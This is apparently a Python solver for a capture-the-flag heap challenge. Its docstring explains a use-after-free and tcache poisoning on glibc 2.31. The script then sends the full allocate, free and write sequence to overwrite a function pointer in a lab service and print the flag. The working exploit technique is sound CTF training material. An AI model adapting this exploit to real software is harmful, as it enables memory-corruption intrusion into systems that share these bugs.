#!/usr/bin/env python3
"""
Solver for PWN CHALLENGE 5 (NexusMind :: Prompt Cache Gateway v2.14)
Category: PWN / Heap Exploitation
Points: 274
Target: nc 172.31.102.101 10106

Vulnerabilities & Exploitation:
1. Use-After-Free (UAF) & Double Free:
   - Command `clear <slot>` frees `slot[i].buf` via `free()`, but never zeros out
     the pointer `slot[i].buf` or resets `slot[i].emit_hook`.
   - The user can still read from a cleared slot via `print <slot>` (UAF read)
     and write into the freed buffer via `write <slot> <n>` (UAF write).
2. Tcache Poisoning (glibc 2.31 / x86_64, No-PIE):
   - The binary has No-PIE (base address: 0x400000).
   - Global array `slots` is located at `0x404040` in BSS.
   - Each slot is 24 bytes:
       offset 0x00: void (*emit_hook)(char *buf)
       offset 0x08: char *buf
       offset 0x10: size_t size
   - In glibc tcache, allocating 32 bytes places chunks in the 0x30 bin.
   - We allocate slot 0 and slot 1, then free both into tcache.
   - Using UAF write on slot 1, we overwrite chunk 1's `fd` pointer with `0x404040`
     (the address of `slots[0]` in BSS).
   - We then allocate slot 2 (which pops chunk 1) and slot 3 (which pops `0x404040`).
   - Slot 3's buffer now directly overlaps `slots[0]`!
3. Control Flow Hijack / Win Function:
   - A hidden backdoor / win function exists at `0x401451` which retrieves `getenv("FLAG")`
     and outputs the bounty gate message and flag.
   - Via `write 3 24`, we overwrite:
       `slots[0].emit_hook = 0x401451` (win function)
       `slots[0].buf       = 0x404048`
       `slots[0].size      = 32`
   - Triggering `print 0` executes `slots[0].emit_hook(slots[0].buf)`, calling `win()`
     and printing the flag!
"""
import socket
import struct
import time
import sys
import re

sys.stdout.reconfigure(encoding='utf-8', errors='replace')

HOST = '172.31.102.101'
PORT = 10106

def p64(v):
    return struct.pack('<Q', v)

def solve(host=HOST, port=PORT):
    print(f"[*] Connecting to {host}:{port}...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5.0)
    s.connect((host, int(port)))

    time.sleep(0.1)
    banner = s.recv(4096).decode('utf-8', errors='replace')
    print("[*] Banner received:")
    print(banner.strip())

    # Step 1: Allocate slot 0 and slot 1
    print("[*] Step 1: Provisioning slots 0 and 1 (size 32)...")
    s.sendall(b'alloc 0 32\n')
    time.sleep(0.05); s.recv(4096)
    s.sendall(b'alloc 1 32\n')
    time.sleep(0.05); s.recv(4096)

    # Step 2: Clear slots 0 and 1 into tcache bin 0x30
    print("[*] Step 2: Freeing slots to populate tcache bin 0x30...")
    s.sendall(b'clear 0\n')
    time.sleep(0.05); s.recv(4096)
    s.sendall(b'clear 1\n')
    time.sleep(0.05); s.recv(4096)

    # Step 3: Poison tcache fd via UAF write on slot 1
    # slots array in BSS starts at 0x404040
    SLOTS_ARRAY_ADDR = 0x404040
    print(f"[*] Step 3: Poisoning tcache fd -> {hex(SLOTS_ARRAY_ADDR)} via UAF write...")
    s.sendall(b'write 1 8\n')
    time.sleep(0.05)
    s.sendall(p64(SLOTS_ARRAY_ADDR) + b'\n')
    time.sleep(0.05); s.recv(4096)

    # Step 4: Allocate slot 2 (pops original chunk 1) and slot 3 (pops 0x404040)
    print("[*] Step 4: Allocating slots 2 and 3 to acquire BSS chunk at 0x404040...")
    s.sendall(b'alloc 2 32\n')
    time.sleep(0.05); s.recv(4096)
    s.sendall(b'alloc 3 32\n')
    time.sleep(0.05); s.recv(4096)

    # Step 5: Overwrite slots[0] metadata via slot 3
    # Offset 0x00: emit_hook = 0x401451 (win function)
    # Offset 0x08: buf = 0x404048
    # Offset 0x10: size = 32
    WIN_FUNC = 0x401451
    print(f"[*] Step 5: Overwriting slots[0].emit_hook with win function ({hex(WIN_FUNC)})...")
    payload = p64(WIN_FUNC) + p64(0x404048) + p64(32)
    s.sendall(f'write 3 {len(payload)}\n'.encode())
    time.sleep(0.05)
    s.sendall(payload + b'\n')
    time.sleep(0.05); s.recv(4096)

    # Step 6: Trigger win function via print 0
    print("[*] Step 6: Triggering emit hook via 'print 0'...")
    s.sendall(b'print 0\n')
    time.sleep(0.3)
    resp = s.recv(4096).decode('utf-8', errors='replace')
    s.close()

    print("[*] Service response:")
    print(resp.strip())

    m = re.search(r'flag\{[^}]+\}', resp)
    if m:
        flag = m.group(0)
        print(f"\n[+] SUCCESS! FLAG: {flag}\n")
        return flag
    else:
        print("[-] Flag pattern not found!")
        return None

if __name__ == '__main__':
    host = sys.argv[1] if len(sys.argv) > 1 else HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else PORT
    solve(host, port)
